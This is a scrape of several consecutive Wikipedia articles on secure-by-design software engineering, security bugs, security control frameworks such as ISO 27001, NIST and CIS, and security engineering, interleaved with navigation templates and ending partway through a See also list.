Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Software distribution
Licenses


Beerware


Floating licensing


Free and open-source


Free


Open source


Freely redistributable


License-free


Proprietary


Public domain


Source-available


Compensation models


Adware


Commercial software


Retail software


Crippleware


Crowdfunding


Freemium


Freeware


Pay what you want


Careware


Donationware


Open-core model


Postcardware


Shareware


Nagware


Trialware


Delivery methods


Digital distribution


File sharing


On-premises


Pre-installed


Product bundling


Retail software


Sneakernet


Software as a service


Deceptive and/or illicit


Unwanted software bundling


Malware


Infostealer


Ransomware


Spyware


Trojan horse


Worm


Scareware


Shovelware


Software release life cycle


Abandonware


End-of-life


Long-term support


Software maintenance


Software maintainer


Software publisher


Vaporware


list


Copy protection


Digital rights management


Software protection dongle


License manager


Product activation


Product key


Software copyright


Software license server


Software patent


Torrent poisoning




v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Scareware&oldid=1242995909
"


Categories
: 
Types of malware
False advertising
Cybercrime
Social engineering (security)
Hidden categories: 
Webarchive template wayback links
CS1 errors: missing periodical
All articles with dead external links
Articles with dead external links from February 2022
Articles with permanently dead external links
Articles with short description
Short description is different from Wikidata
All articles with unsourced statements
Articles with unsourced statements from December 2019
Commons category link from Wikidata











From Wikipedia, the free encyclopedia






Software engineering approach


This article 
contains 
instructions, advice, or how-to content
.
 Please help 
rewrite the content
 so that it is more encyclopedic or 
move
 it to 
Wikiversity
, 
Wikibooks
, or 
Wikivoyage
.
 
(
June 2022
)


Secure by design
, in 
software engineering
, means that software products and capabilities have been 
designed
 to be foundationally 
secure
.

Alternate security strategies, tactics and patterns are considered at the beginning of a software design, and the best are selected and enforced by the architecture, and they are used as guiding principles for 
developers
.
[
1
]
 It is also encouraged to use strategic design patterns that have beneficial effects on 
security
, even though those design patterns were not originally devised with security in mind.
[
2
]


Secure by Design is increasingly becoming the mainstream development approach to ensure security and 
privacy
 of software systems. In this approach, security is considered and built into the system at every layer and starts with a robust architecture design. Security architectural design decisions are based on well-known security strategies, tactics, and patterns defined as reusable techniques for achieving specific quality concerns. Security tactics/patterns provide solutions for enforcing the necessary 
authentication
, authorization, confidentiality, 
data integrity
, privacy, accountability, availability, safety and non-repudiation requirements, even when the system is under attack.
[
3
]

In order to ensure the security of a software system, not only is it important to design a robust intended security architecture but it is also necessary to map updated security strategies, tactics and patterns to software development in order to maintain security persistence.





Expect attacks
[
edit
]


Malicious attacks on software should be assumed to occur, and care is taken to minimize impact.  Security vulnerabilities are anticipated, along with invalid 
user
 input.
[
4
]
 Closely related is the practice of using "good" software design, such as 
domain-driven design
 or 
cloud native
, as a way to increase security by reducing risk of vulnerability-opening mistakes—even though the design principles used were not originally conceived for security purposes.



Avoid security through obscurity
[
edit
]


Generally, designs that work well do not 
rely on being secret
. Often, secrecy reduces the number of attackers by demotivating a subset of the threat population. The logic is that if there is an increase in complexity for the attacker, the increased attacker effort to compromise the target will discourage them. While this technique implies reduced inherent risks, a virtually infinite set of threat actors and techniques applied over time will cause most secrecy methods to fail. While not mandatory, proper security usually means that everyone is allowed to know and understand the design 
because it is secure
. This has the advantage that many people are looking at the 
source code
, which improves the odds that any flaws will be found sooner (see 
Linus's law
). The disadvantage is that attackers can also obtain the code, which makes it easier for them to find 
vulnerabilities
 to exploit. It is generally believed, though, that the advantage of the open source code outweighs the disadvantage.



Fewest privileges
[
edit
]


Also, it is important that everything works with the fewest 
privileges
 possible (see the 
principle of least privilege
). For example, a 
web server
 that runs as the 
administrative user
 ("root" or "admin") can have the privilege to remove files and users. A flaw in such a program could therefore put the entire system at risk, whereas a web server that runs inside an 
isolated environment
, and only has the privileges for required 
network
 and 
filesystem
 functions, cannot compromise the system it runs on unless the security around it in itself is also flawed.



Methodologies
[
edit
]


Secure Design should be a consideration at all points in the development lifecycle (whichever 
development methodology
 is chosen). Some pre-built Secure By Design development methodologies exist (e.g. 
Microsoft Security Development Lifecycle
).



Standards and legislation
[
edit
]


Main article: 
Application security § Security standards and regulations


Standards and Legislation exist to aide secure design by controlling the definition of "Secure", and providing concrete steps to testing and integrating secure systems.

Some examples of standards which cover or touch on Secure By Design principles:



ETSI
 TS 103 645 
[
5
]
 which is included in part in the UK Government "Proposals for regulating consumer smart product cyber security" 
[
6
]


ISO/IEC 27000-series
 covers many aspects of secure design.


Server/client architectures
[
edit
]


In server/client architectures, the program at the other side may not be an authorised client and the client's server may not be an authorised server. Even when they are, a 
man-in-the-middle attack
 could compromise communications.

Often the easiest way to break the security of a client/server system is not to go head on to the security mechanisms, but instead to go around them.  A man in the middle attack is a simple example of this, because you can use it to collect details to impersonate a user.  Which is why it is important to consider 
encryption
, 
hashing
, and other security mechanisms in your design to ensure that information collected from a potential attacker won't allow access.

Another key feature to client-server security design is 
good coding practices
.  For example, following a known software design structure, such as client and broker, can help in designing a well-built structure with a solid foundation.  Furthermore, if the software is to be modified in the future, it is even more important that it follows a logical foundation of separation between the client and server.  This is because if a programmer comes in and cannot clearly understand the dynamics of the program, they may end up adding or changing something that can add a security flaw.  Even with the best design, this is always a possibility, but the better the standardization of the design, the less chance there is of this occurring.



See also
[
edit
]


Computer security


Cyber security standards


Hardening


Multiple Independent Levels of Security


Secure by default


Security through obscurity


Software Security Assurance


References
[
edit
]






^
 
Santos, Joanna C. S.; Tarrit, Katy; Mirakhorli, Mehdi (2017). "A Catalog of Security Architecture Weaknesses". 
2017 IEEE International Conference on Software Architecture Workshops (ICSAW)
. pp. 220–223. 
doi
:
10.1109/ICSAW.2017.25
. 
ISBN
 
978-1-5090-4793-2
. 
S2CID
 
19534342
.




^
 
Dan Bergh Johnsson; Daniel Deogun; Daniel Sawano (2019). 
Secure By Design
. Manning Publications. 
ISBN
 
9781617294358
.




^
 
Hafiz, Munawar; Adamczyk, Paul; Johnson, Ralph E. (October 2012). "Growing a pattern language (For security)". 
Proceedings of the ACM international symposium on New ideas, new paradigms, and reflections on programming and software
. pp. 139–158. 
doi
:
10.1145/2384592.2384607
. 
ISBN
 
9781450315623
. 
S2CID
 
17206801
.




^
 
Dougherty, Chad; Sayre, Kirk; Seacord, Robert C.; Svoboda, David; Togashi, Kazuya (October 2009). "Secure Design Patterns". 
doi
:
10.1184/R1/6583640.v1
.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 
"ETSI TS 103 645"
 
(PDF)
.




^
 
"Policy paper: Proposals for regulating consumer smart product cyber security - call for views"
.






External links
[
edit
]


Secure Programming for Linux and Unix HOWTO


Secure UNIX Programming FAQ


Top 10 Secure Coding Practices


Security by Design Principles


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Computer science
Note: This template roughly follows the 2012 
ACM Computing Classification System
.
Hardware


Printed circuit board


Peripheral


Integrated circuit


Very Large Scale Integration


Systems on Chip (SoCs)


Energy consumption (Green computing)


Electronic design automation


Hardware acceleration


Processor


Size
 / 
Form


Computer systems organization


Computer architecture


Computational complexity


Dependability


Embedded system


Real-time computing


Networks


Network architecture


Network protocol


Network components


Network scheduler


Network performance evaluation


Network service


Software organization


Interpreter


Middleware


Virtual machine


Operating system


Software quality


Software notations
 and 
tools


Programming paradigm


Programming language


Compiler


Domain-specific language


Modeling language


Software framework


Integrated development environment


Software configuration management


Software library


Software repository


Software development


Control variable


Software development process


Requirements analysis


Software design


Software construction


Software deployment


Software engineering


Software maintenance


Programming team


Open-source model


Theory of computation


Model of computation


Stochastic


Formal language


Automata theory


Computability theory


Computational complexity theory


Logic


Semantics


Algorithms


Algorithm design


Analysis of algorithms


Algorithmic efficiency


Randomized algorithm


Computational geometry


Mathematics of 
computing


Discrete mathematics


Probability


Statistics


Mathematical software


Information theory


Mathematical analysis


Numerical analysis


Theoretical computer science


Information systems


Database management system


Information storage systems


Enterprise information system


Social information systems


Geographic information system


Decision support system


Process control system


Multimedia information system


Data mining


Digital library


Computing platform


Digital marketing


World Wide Web


Information retrieval


Security


Cryptography


Formal methods


Security hacker


Security services


Intrusion detection system


Hardware security


Network security


Information security


Application security


Human–computer interaction


Interaction design


Social computing


Ubiquitous computing


Visualization


Accessibility


Concurrency


Concurrent computing


Parallel computing


Distributed computing


Multithreading


Multiprocessing


Artificial intelligence


Natural language processing


Knowledge representation and reasoning


Computer vision


Automated planning and scheduling


Search methodology


Control method


Philosophy of artificial intelligence


Distributed artificial intelligence


Machine learning


Supervised learning


Unsupervised learning


Reinforcement learning


Multi-task learning


Cross-validation


Graphics


Animation


Rendering


Photograph manipulation


Graphics processing unit


Mixed reality


Virtual reality


Image compression


Solid modeling


Applied computing


Quantum Computing


E-commerce


Enterprise software


Computational mathematics


Computational physics


Computational chemistry


Computational biology


Computational social science


Computational engineering


Differentiable computing


Computational healthcare


Digital art


Electronic publishing


Cyberwarfare


Electronic voting


Video games


Word processing


Operations research


Educational technology


Document management




 
Category


 
Outline


 
Glossaries












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Secure_by_design&oldid=1243472001
"


Categories
: 
Computer security procedures
Software quality
Software development philosophies
Software development process
Hidden categories: 
CS1 errors: missing periodical
Articles with short description
Short description is different from Wikidata
Articles needing cleanup from June 2022
All pages needing cleanup
Articles containing how-to sections











From Wikipedia, the free encyclopedia






Type of software bug


A 
security bug
 or 
security defect
 is a 
software bug
 that can be exploited to gain unauthorized access or privileges on a computer system. Security bugs introduce 
security vulnerabilities
 by compromising one or more of:



Authentication
 of 
users
 and other entities
[
1
]


Authorization
 of 
access rights
 and 
privileges
[
1
]


Data 
confidentiality


Data integrity


Security bugs do not need be identified nor 
exploited
 to be qualified as such and are assumed to be much more common than known vulnerabilities in almost any system.





Causes
[
edit
]


Main article: 
Vulnerability (computing)


Security bugs, like all other 
software bugs
, stem from 
root causes
 that can generally be traced to either absent or inadequate:
[
2
]




Software developer
 training


Use case
 analysis


Software engineering methodology


Quality assurance
 testing


and other 
best practices


Taxonomy
[
edit
]


Security bugs generally fall into a fairly small number of broad categories that include:
[
3
]




Memory safety
 (e.g. 
buffer overflow
 and 
dangling pointer
 bugs)


Race condition


Secure input and output handling


Faulty use of an 
API


Improper 
use case
 handling


Improper 
exception handling


Resource leaks
, often but not always due to improper exception handling


Preprocessing input strings before they are checked for being acceptable


Mitigation
[
edit
]


See 
software security assurance
.



See also
[
edit
]


Computer security


Hacking: The Art of Exploitation


IT risk


Threat (computer)


Vulnerability (computing)


Hardware bug


Secure coding


References
[
edit
]






^ 
a
 
b
 
"CWE/SANS TOP 25 Most Dangerous Software Errors"
. SANS
. Retrieved 
13 July
 2012
.




^
 
"Software Quality and Software Security"
. 2008-11-02
. Retrieved 
2017-04-28
.




^
 
Alhazmi, Omar H.; Woo, Sung-Whan; Malaiya, Yashwant K. (Jan 2006). 
"Security vulnerability categories in major software systems"
. 
Proceedings of the Third IASTED International Conference on Communication, Network, and Information Security
.






Further reading
[
edit
]


Open Web Application Security Project (21 August 2015). 
"2013 Top 10 List"
.


"CWE/SANS TOP 25 Most Dangerous Software Errors"
. SANS
. Retrieved 
13 July
 2012
.


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Security_bug&oldid=1182980984
"


Categories
: 
Computer security
Software bugs
Software testing
Hidden categories: 
Articles with short description
Short description is different from Wikidata











From Wikipedia, the free encyclopedia






Protection measures for a system


This article 
may be 
confusing or unclear
 to readers
.
 Please help 
clarify the article
. There might be a discussion about this on 
the talk page
.
 
(
January 2012
)
 (
Learn how and when to remove this message
)


Security controls
 are safeguards or 
countermeasures
 to avoid, detect, counteract, or minimize 
security risks
 to physical property, information, computer systems, or other assets.
[
1
]
 In the field of 
information security
, such controls protect the 
confidentiality, integrity and availability of information
.

Systems of controls can be referred to as frameworks or standards. Frameworks can enable an organization to manage security controls across different types of assets with consistency.





Types of security controls
[
edit
]


Security
 controls can be classified by various criteria. For example, controls can be classified by how/when/where they act relative to a security breach (sometimes termed 
control types
):



Preventive controls
 are intended to prevent an incident from occurring e.g. by locking out unauthorized intruders;


Detective controls
 are intended to identify, characterize, and log an 
incident
  e.g. isolating suspicious behavior from a 
malicious actor
 on a network;
[
2
]


Compensating controls
 mitigate ongoing damages of an active incident, e.g. shutting down a system upon detecting 
malware
.


After the event, 
corrective controls
 are intended to restore damage caused by the incident e.g. by recovering the organization to normal working status as efficiently as possible.


Security controls can also be classified according to the implementation of the control (sometimes termed 
control categories
), for example:



Physical controls
 - e.g. fences, doors, locks and fire extinguishers;


Procedural or administrative controls
 - e.g. 
incident response processes
, management oversight, 
security awareness
 and training;


Technical or logical controls
 - e.g. 
user authentication
 (login) and 
logical access controls
, 
antivirus software
, 
firewalls
;


Legal and regulatory or compliance controls
 - e.g. 
privacy laws
, policies and clauses.


Information security standards and control frameworks
[
edit
]


Main article: 
Information security standards


Numerous information security standards promote good security practices and define frameworks or systems to structure the analysis and design for managing information security controls.  Some of the most well known standards are outlined below.



International Standards Organization
[
edit
]


Main article: 
ISO/IEC 27000 family


ISO/IEC 27001:2022 was released in October 2022. All organizations certified to ISO 27001:2013 are obliged to transition to the new version of the Standard within 3 years (by October 2025). 

The 2022 version of the Standard specifies 93 controls in 4 groups:



A.5: Organisational controls


A.6: People controls


A.7: Physical controls


A.8: Technological controls


It groups these controls into operational capabilities as follows:



Governance


Asset management


Information protection


Human resource security


Physical security


System and network security


Application security


Secure configuration


Identity and access management


Threat and vulnerability management


Continuity


Supplier relationships security


Legal and compliance


Information security event management; and


Information_security_assurance


The previous version of the Standard, 
ISO/IEC 27001
, specified 114 controls in 14 groups:



A.5: Information security policies


A.6: How information security is organised


A.7: Human resources security - controls that are applied before, during, or after employment.


A.8: Asset management


A.9: Access controls and managing user access


A.10: Cryptographic technology


A.11: Physical security of the organisation's sites and equipment


A.12: Operational security


A.13: Secure communications and data transfer


A.14: Secure acquisition, development, and support of information systems


A.15: Security for suppliers and third parties


A.16: Incident management


A.17: Business continuity/disaster recovery (to the extent that it affects information security)


A.18: Compliance - with internal requirements, such as policies, and with external requirements, such as laws.


U.S. Federal Government information security standards
[
edit
]


The 
Federal Information Processing Standards (FIPS)
 apply to all US government agencies.  However, certain national security systems, under the purview of the 
Committee on National Security Systems
, are managed outside these standards.

Federal information Processing Standard 200 (FIPS 200), "Minimum Security Requirements for Federal Information and Information Systems," specifies the minimum security controls for federal information systems and the processes by which risk-based selection of security controls occurs.  The catalog of minimum security controls is found in 
NIST
 Special Publication SP 800-53.

FIPS 200 identifies 17 broad control families:



AC Access Control


AT Awareness and Training


AU Audit and Accountability


CA Security Assessment and Authorization (historical abbreviation)


CM Configuration Management


CP Contingency Planning


IA Identification and Authentication


IR Incident Response


MA Maintenance


MP Media Protection


PE Physical and Environmental Protection


PL Planning


PS Personnel Security


RA Risk Assessment


SA System and Services Acquisition


SC System and Communications Protection


SI System and Information Integrity


National Institute of Standards and Technology



NIST Cybersecurity Framework
[
edit
]


Main article: 
NIST Cybersecurity Framework


A maturity based framework divided into five functional areas and approximately 100 individual controls in its "core."



NIST SP-800-53
[
edit
]


Main article: 
NIST Special Publication 800-53


A database of nearly one thousand technical controls grouped into families and cross references.



Starting with Revision 3 of 800-53, Program Management controls were identified.  These controls are independent of the system controls, but are necessary for an effective security program.


Starting with Revision 4 of 800-53, eight families of privacy controls were identified to align the security controls with the privacy expectations of federal law.


Starting with Revision 5 of 800-53, the controls also address data privacy as defined by the NIST Data Privacy Framework.


Commercial Control Sets
[
edit
]


COBIT5
[
edit
]


A proprietary control set published by ISACA.
[
3
]




Governance of Enterprise IT

Evaluate, Direct and Monitor (EDM) – 5 processes


Management of Enterprise IT

Align, Plan and Organise (APO) – 13 processes


Build, Acquire and Implement (BAI) – 10 processes


Deliver, Service and Support (DSS) – 6 processes


Monitor, Evaluate and Assess (MEA) - 3 processes


CIS Controls (CIS 18)
[
edit
]


Formerly known as the SANS Critical Security Controls now officially called the CIS Critical Security Controls (COS Controls).
[
4
]
 The CIS Controls are divided into 18 controls.



CIS Control 1: Inventory and Control of Enterprise Assets


CIS Control 2: Inventory and Control of Software Assets


CIS Control 3: Data Protection


CIS Control 4: Secure Configuration of Enterprise Assets and Software


CIS Control 5: Account Management


CIS Control 6: Access Control Management


CIS Control 7: Continuous Vulnerability Management


CIS Control 8: Audit Log Management


CIS Control 9: Email and Web Browser Protections


CIS Control 10: Malware Defenses


CIS Control 11: Data Recovery


CIS Control 12: Network Infrastructure Management


CIS Control 13: Network Monitoring and Defense


CIS Control 14: Security Awareness and Skills Training


CIS Control 15: Service Provider Management


CIS Control 16: Application Software Security


CIS Control 17: Incident Response Management


CIS Control 18: Penetration Testing


The Controls are divided further into Implementation Groups (IGs) which are a recommended guidance to prioritize implementation of the CIS controls.
[
5
]




Telecommunications
[
edit
]


This section 
needs expansion
. You can help by 
adding to it
.  
(
July 2024
)


Main article: 
Security service (telecommunication)


In telecommunications, security controls are defined as 
security services
 as part of the 
OSI model
:



ITU-T X.800 Recommendation.


ISO ISO 7498-2


These are technically aligned.
[
6
]
[
7
]
 This model is widely recognized.
[
8
]


[
9
]




Data liability (legal, regulatory, compliance)
[
edit
]


The intersection of security risk and laws that set standards of care is where data liability are defined.  A handful of databases are emerging to help risk managers research laws that define liability at the country, province/state, and local levels. In these control sets, compliance with relevant laws are the actual risk mitigators.



Perkins Coie Security Breach Notification Chart: A set of articles (one per state) that define data breach notification requirements among US states.
[
10
]


NCSL Security Breach Notification Laws: A list of US state statutes that define data breach notification requirements.
[
11
]


ts jurisdiction: A commercial cybersecurity research platform with coverage of 380+ US State & Federal laws that impact cybersecurity before and after a breach.  ts jurisdiction also maps to the NIST Cybersecurity Framework.
[
12
]


Business control frameworks
[
edit
]


This section 
is in 
list
 format but may read better as 
prose
.
 You can help by 
converting this section
, if appropriate. 
Editing help
 is available.
 
(
July 2024
)


There are a wide range of frameworks and standards looking at internal business, and inter-business controls, including:



SSAE 16


ISAE 3402


Payment Card Industry Data Security Standard


Health Insurance Portability and Accountability Act


COBIT 4/5


CIS Top-20


NIST Cybersecurity Framework


See also
[
edit
]


Access control


Aviation security


Countermeasure


Defense in depth


Environmental design


Information security


Physical Security


Risk


Security


Security engineering


Security management


Security services


Gordon–Loeb model
 for cyber security investments


References
[
edit
]






^
 
"What are Security Controls?"
. 
www.ibm.com
. Retrieved 
2020-10-31
.




^
 
"Detective controls"
. 
AWS
. Dec 12, 2022.




^
 
"COBIT Framework | Risk & Governance | Enterprise IT Management - ISACA"
. 
cobitonline.isaca.org
. Retrieved 
2020-03-18
.




^
 
"The 18 CIS Controls"
. 
CIS
. Retrieved 
2022-11-08
.




^
 
"CIS Critical Security Controls Implementation Groups"
. 
CIS
. Retrieved 
2022-11-08
.




^
 
X.800 : Security architecture for Open Systems Interconnection for CCITT applications




^
 
ISO 7498-2 (Information processing systems – Open systems interconnection – Basic Reference Model – Part 2: Security architecture)




^
 

William Stallings
Crittografia e sicurezza delle reti
Seconda edizione

ISBN
 
88-386-6377-7

Traduzione Italiana a cura di Luca Salgarelli
di Cryptography and Network security 4 edition
Pearson
2006




^
 
Securing information and communications systems: principles, technologies, and applications
Steven Furnell, Sokratis Katsikas, Javier Lopez, Artech House, 2008 - 362 pages




^
 
"Security Breach Notification Chart"
. 
Perkins Coie
. Retrieved 
2020-03-18
.




^
 
"Security Breach Notification Laws"
. 
www.ncsl.org
. Retrieved 
2020-03-18
.




^
 
"ts jurisdiction"
. 
Threat Sketch
. Retrieved 
2020-03-18
.






External links
[
edit
]


NIST SP 800-53 Revision 4


DoD Instruction 8500.2


FISMApedia Terms










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Security_controls&oldid=1237661168
"


Categories
: 
Computer network security
Computer security procedures
Data security
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Wikipedia articles needing clarification from January 2012
All Wikipedia articles needing clarification
Articles to be expanded from July 2024
All articles to be expanded
Articles needing cleanup from July 2024
All pages needing cleanup
Articles with sections that need to be turned into prose from July 2024











From Wikipedia, the free encyclopedia






Process of incorporating security controls into an information system


This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Security engineering"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
June 2017
)
 (
Learn how and when to remove this message
)


Security engineering
 is the process of incorporating 
security controls
 into an 
information system
 so that the controls become an integral part of the system’s operational capabilities.
[
1
]
 It is similar to other systems engineering activities in that its primary motivation is to support the delivery of engineering solutions that satisfy pre-defined functional and user 
requirements
, but it has the added dimension of preventing misuse and malicious behavior. Those constraints and restrictions are often asserted as a 
security policy
.

In one form or another, security engineering has existed as an informal field of study for several centuries. For example, the fields of 
locksmithing
 and 
security printing
 have been around for many years. The concerns for modern security engineering and computer systems were first solidified in a RAND paper from 1967, "Security and Privacy in Computer Systems" by Willis H. Ware.
[
2
]
 This paper, later expanded in 1979,
[
3
]
  provided many of the fundamental information security concepts, labelled today as Cybersecurity, that impact modern computer systems, from cloud implementations to embedded IoT.

Recent catastrophic events, most notably 
9/11
, have made security engineering quickly become a rapidly-growing field. In fact, in a report completed in 2006, it was estimated that the global security industry was valued at US $150 billion.

Security engineering involves aspects of 
social science
, 
psychology
 (such as designing a system to "
fail well
", instead of trying to eliminate all sources of error), and 
economics
 as well as 
physics
, 
chemistry
, 
mathematics
, criminology 
architecture
, and 
landscaping
.
[
4
]

Some of the techniques used, such as 
fault tree analysis
, are derived from 
safety engineering
.

Other techniques such as 
cryptography
 were previously restricted to military applications. One of the pioneers of establishing security engineering as a formal field of study is 
Ross Anderson
.





Qualifications
[
edit
]


No single qualification exists to become a security engineer.

However, an undergraduate and/or graduate degree, often in 
computer science
, 
computer engineering
, or physical protection focused degrees such as Security Science, in combination with practical work experience (systems, network engineering, 
software development
, physical protection system modelling etc.) most qualifies an individual to succeed in the field. Other degree qualifications with a security focus exist. Multiple 
certifications
, such as the 
Certified Information Systems Security Professional
, or Certified Physical Security Professional are available that may demonstrate expertise in the field. Regardless of the qualification, the course must include a knowledge base to diagnose the security system drivers, security theory and principles including defense in depth, protection in depth, situational crime prevention and crime prevention through environmental design to set the protection strategy (professional inference), and technical knowledge including physics and mathematics to design and commission the engineering treatment solution. A security engineer can also benefit from having knowledge in cyber security and information security. Any previous work experience related to privacy and computer science is also valued. 

All of this knowledge must be braced by professional attributes including strong communication skills and high levels of literacy for engineering report writing. Security engineering also goes by the label Security Science.



Related-fields
[
edit
]


Information security


See esp. 
Computer security


protecting data from unauthorized access, use, disclosure, destruction, modification, or disruption to access.


Physical security


deter attackers from accessing a facility, resource, or information stored on physical media.


Technical surveillance counter-measures


Economics of security


the economic aspects of economics of privacy and computer security.


Methodologies
[
edit
]


Technological advances, principally in the field of 
computers
, have now allowed the creation of far more complex systems, with new and complex security problems. Because modern systems cut across many areas of human endeavor, security engineers not only need consider the mathematical and physical properties of systems; they also need to consider attacks on the people who use and form parts of those systems using 
social engineering
 attacks. Secure systems have to resist not only technical attacks, but also 
coercion
, 
fraud
, and 
deception
 by 
confidence tricksters
.



Web applications
[
edit
]


Main article: 
Web security


According to the 
Microsoft
 Developer Network
 the patterns and practices of security engineering consist of the following activities:
[
5
]




Security Objectives


Security Design Guidelines


Security Modeling


Security Architecture and Design Review


Security Code Review


Security Testing


Security Tuning


Security Deployment Review


These activities are designed to help meet security objectives in the 
software life cycle
.



Physical
[
edit
]


Main article: 
Physical security


Canadian Embassy in Washington, D.C. showing planters being used as vehicle barriers, and barriers and gates along the vehicle entrance


Understanding of a 
typical
 threat and the usual risks to people and property.


Understanding the incentives created both by the threat and the countermeasures.


Understanding risk and threat analysis methodology and the benefits of an empirical study of the physical security of a facility.


Understanding how to apply the methodology to buildings, critical infrastructure, ports, public transport and other facilities/compounds.


Overview of common physical and technological methods of protection and understanding their roles in 
deterrence
, detection and mitigation.


Determining and prioritizing security needs and aligning them with the perceived threats and the available budget.


Product
[
edit
]


Product security engineering is security engineering applied specifically to the products that an organization creates, distributes, and/or sells. Product security engineering is distinct from corporate/enterprise security,
[
6
]
 which focuses on securing corporate networks and systems that an organization uses to conduct business.

Product security includes security engineering applied to:



Hardware devices such as cell phones, computers, 
Internet of things
 devices, and cameras.


Software such as operating systems, applications, and firmware.


Such security engineers are often employed in separate teams from corporate security teams and work closely with product engineering teams.



Target hardening
[
edit
]


Whatever the target, there are multiple ways of preventing penetration by unwanted or unauthorized persons. Methods include placing 
Jersey barriers
, stairs or other sturdy obstacles outside tall or politically sensitive buildings to prevent car and 
truck bombings
. Improving the method of 
visitor management
 and some new electronic 
locks
 take advantage of technologies such as 
fingerprint
 scanning, iris or 
retinal scanning
, and 
voiceprint identification
 to authenticate users.



See also
[
edit
]










Computer-related




Authentication


Cryptanalysis


Data remanence


Defensive programming
 (secure coding)


Earthquake engineering


Economics of security


Engineering Product Lifecycle


Explosion protection


Password policy


Secure coding


Security hacker


Security pattern


Security Requirements Analysis


Security testing


Software cracking


Software security assurance


Systems engineering


Trusted system






Physical




Access control


Authorization


Critical infrastructure protection


Environmental design
